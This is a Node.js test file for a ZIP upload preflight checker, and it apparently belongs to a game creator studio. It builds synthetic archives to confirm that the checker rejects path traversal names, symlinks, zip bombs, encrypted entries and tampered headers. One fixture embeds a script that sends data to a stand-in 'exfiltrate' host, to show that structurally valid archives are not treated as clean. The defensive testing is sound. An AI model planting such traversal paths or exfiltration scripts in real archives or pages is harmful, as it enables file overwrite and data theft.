// ANEVUM V051 structural ZIP preflight tests. Synthetic files, no network,
// filesystem extraction, game execution or public publishing.
import test from 'node:test';
import assert from 'node:assert/strict';
import {createHash} from 'node:crypto';
import {deflateRawSync} from 'node:zlib';
import {inspectCreatorZip,PreflightError,PREFLIGHT_LIMITS} from '../creator-studio/inspect-creator-zip.mjs';

const hash=b=>createHash('sha256').update(b).digest('hex');
function makeZip(input,{preamble=Buffer.alloc(0),append=Buffer.alloc(0)}={}){
 const local=[],central=[];let start=preamble.length;
 for(const spec of input){
  const name=Buffer.from(spec.name,'utf8');
  const plain=Buffer.isBuffer(spec.data)?spec.data:Buffer.from(spec.data??'data','utf8');
  const method=spec.method??8,packed=method===8?deflateRawSync(plain):plain;
  // Node supplies the CRC table here independently of the production helper.
  let crc=0xffffffff;
  for(const byte of plain){crc^=byte;for(let bit=0;bit<8;bit++)crc=(crc&1)?(crc>>>1)^0xedb88320:crc>>>1;}
  crc=(crc^0xffffffff)>>>0;
  if(spec.badCrc)crc^=0x12345;
  const flags=spec.flags??0,mode=spec.mode??0o100644;
  const lh=Buffer.alloc(30);
  lh.writeUInt32LE(0x04034b50,0);lh.writeUInt16LE(20,4);
  lh.writeUInt16LE(flags,6);lh.writeUInt16LE(method,8);
  lh.writeUInt32LE(crc>>>0,14);lh.writeUInt32LE(packed.length,18);
  lh.writeUInt32LE(plain.length,22);lh.writeUInt16LE(name.length,26);
  local.push(lh,name,packed);
  const ch=Buffer.alloc(46);
  ch.writeUInt32LE(0x02014b50,0);ch.writeUInt16LE((3<<8)|20,4);
  ch.writeUInt16LE(20,6);ch.writeUInt16LE(flags,8);
  ch.writeUInt16LE(method,10);ch.writeUInt32LE(crc>>>0,16);
  ch.writeUInt32LE(packed.length,20);ch.writeUInt32LE(plain.length,24);
  ch.writeUInt16LE(name.length,28);
  ch.writeUInt32LE((mode<<16)>>>0,38);ch.writeUInt32LE(start,42);
  central.push(ch,name);
  start+=lh.length+name.length+packed.length;
 }
 const cd=Buffer.concat(central);
 const eocd=Buffer.alloc(22);eocd.writeUInt32LE(0x06054b50,0);
 eocd.writeUInt16LE(input.length,8);eocd.writeUInt16LE(input.length,10);
 eocd.writeUInt32LE(cd.length,12);eocd.writeUInt32LE(start,16);
 return Buffer.concat([preamble,...local,cd,eocd,append]);
}
const good=()=>makeZip([{name:'index.html',data:'<!doctype html><title>ANEVUM SIGNAL 001</title>'},
 {name:'styles.css',data:'body{background:#050b10}'},
 {name:'assets/icon-192.png',data:Buffer.from([137,80,78,71,13,10,26,10])}]);
const check=bytes=>inspectCreatorZip(bytes,{expectedSha256:hash(bytes)});
const reject=(bytes,code)=>assert.throws(()=>check(bytes),e=>
 e instanceof PreflightError&&e.code===code,String(code));
test('bounded static project ZIP receives hash-proven entry manifest, never release permission',()=>{
 const bytes=good(),m=check(bytes);
 assert.equal(m.archiveSha256,hash(bytes));
 assert.equal(m.entryPoint,'index.html');
 assert.equal(m.entries.length,3);
 assert.equal(m.entries[0].name,'index.html');
 assert.equal(m.entries[0].mediaType,'text/html');
 assert.equal(m.entries[2].sha256,hash(Buffer.from([137,80,78,71,13,10,26,10])));
 assert.equal(m.totalUncompressedBytes,Buffer.byteLength('<!doctype html><title>ANEVUM SIGNAL 001</title>')+
  Buffer.byteLength('body{background:#050b10}')+8);
 assert.equal(m.malwareScanPassed,false);
 assert.equal(m.securityReviewPassed,false);
 assert.equal(m.approvedForPublicRelease,false);
 assert.ok(!JSON.stringify(m).includes('private-quarantine/'));
});
test('cannot inspect an archive against absent, invalid, stale, or forged digest',()=>{
 const bytes=good();
 assert.throws(()=>inspectCreatorZip(bytes),/EXPECTED_SHA256_REQUIRED/);
 assert.throws(()=>inspectCreatorZip(bytes,{expectedSha256:hash(bytes).toUpperCase()}),/EXPECTED_SHA256_REQUIRED/);
 assert.throws(()=>inspectCreatorZip(bytes,{expectedSha256:'0'.repeat(64)}),/SUBMISSION_HASH_MISMATCH/);
 const modified=Buffer.from(bytes);modified[49]^=4;
 assert.throws(()=>inspectCreatorZip(modified,{expectedSha256:hash(bytes)}),/SUBMISSION_HASH_MISMATCH/);
});
test('rejects traversal, Windows separators, dotfiles, ambiguous percent escapes and absolute paths',()=>{
 for(const p of ['../index.html','nested/../evil.js','assets\\danger.js','/index.html',
 'assets/.secret','assets/%2e%2e/evil.js','C:/index.html','./index.html','assets//icon.png']){
  const bytes=makeZip([{name:'index.html',data:'home'},{name:p,data:'bad'}]);
  reject(bytes,'UNSAFE_PATH');
 }
});
test('rejects normalized duplicate names, nested archives and unsupported server code',()=>{
 reject(makeZip([{name:'index.html',data:'home'},{name:'art/logo.PNG',data:'logo'},
 {name:'art/logo.png',data:'duplicate'}]),'DUPLICATE_PATH');
 for(const p of ['nested/payload.zip','server/index.php','settings.env','scripts/run.sh','key.pem']){
  reject(makeZip([{name:'index.html',data:'home'},{name:p,data:'bad'}]),'UNSUPPORTED_FILE');
 }
});
test('rejects Unix symlinks and exotic special files even when extension is valid',()=>{
 reject(makeZip([{name:'index.html',data:'home',mode:0o120777}]),'UNSAFE_FILE_MODE');
 reject(makeZip([{name:'index.html',data:'home',mode:0o060666}]),'UNSAFE_FILE_MODE');
});
test('rejects encrypted ZIPs, streaming data descriptors and unknown compression',()=>{
 reject(makeZip([{name:'index.html',data:'home',flags:1}]),'ENCRYPTED_ARCHIVE');
 reject(makeZip([{name:'index.html',data:'home',flags:8}]),'DATA_DESCRIPTOR_UNSUPPORTED');
 reject(makeZip([{name:'index.html',data:'home',method:12}]),'UNSUPPORTED_COMPRESSION');
});
test('rejects compressed bombs, individually oversized entries and excessive entry count',()=>{
 reject(makeZip([{name:'index.html',data:'home'},{name:'bomb.txt',data:Buffer.alloc(3*1048576,65)}]),'SUSPICIOUS_COMPRESSION');
 reject(makeZip([{name:'index.html',data:Buffer.alloc(17*1048576,33)}]),'ENTRY_TOO_LARGE');
 const items=[{name:'index.html',data:'hello'}];
 for(let i=0;i<PREFLIGHT_LIMITS.entries;i++)items.push({name:'file-'+i+'.txt',data:'hello'});
 reject(makeZip(items),'INVALID_ENTRY_COUNT');
});
test('rejects damaged payload CRC, spoofed local name and unsupported appended bytes',()=>{
 reject(makeZip([{name:'index.html',data:'home',badCrc:true}]),'CRC_MISMATCH');
 const damaged=good(),idx=damaged.indexOf(Buffer.from('index.html')),tamper=Buffer.from(damaged);
 assert.ok(idx>=0);tamper[idx]='X'.charCodeAt(0);
 reject(tamper,'LOCAL_FILENAME_MISMATCH');
 reject(makeZip([{name:'index.html',data:'home'}],{append:Buffer.from('malicious tail')}),'MISSING_END_DIRECTORY');
 reject(makeZip([{name:'index.html',data:'home'}],{preamble:Buffer.from('MZ!')}),'PREPENDED_ARCHIVE_CONTENT');
});
test('requires a root HTML entry and rejects empty archives',()=>{
 reject(makeZip([{name:'dist/index.html',data:'home'}]),'MISSING_ROOT_INDEX');
 reject(makeZip([]),'INVALID_ENTRY_COUNT');
});
test('rejects Central Directory fields that disagree with Local File Headers',()=>{
 const bytes=good(),mutated=Buffer.from(bytes),end=mutated.length-22;
 const central=mutated.readUInt32LE(end+16);
 mutated.writeUInt32LE(1,central+24);
 reject(mutated,'LOCAL_HEADER_MISMATCH');
});
test('a structurally valid ZIP with dangerous JavaScript is NOT approved or considered malware-clean',()=>{
 const text='<script>fetch("https://example.invalid/exfiltrate")</script>';
 const result=check(makeZip([{name:'index.html',data:text}]));
 assert.equal(result.entries[0].mediaType,'text/html');
 assert.equal(result.securityReviewPassed,false);
 assert.equal(result.approvedForPublicRelease,false);
 assert.match(result.warning,/No malware scanning/);
});
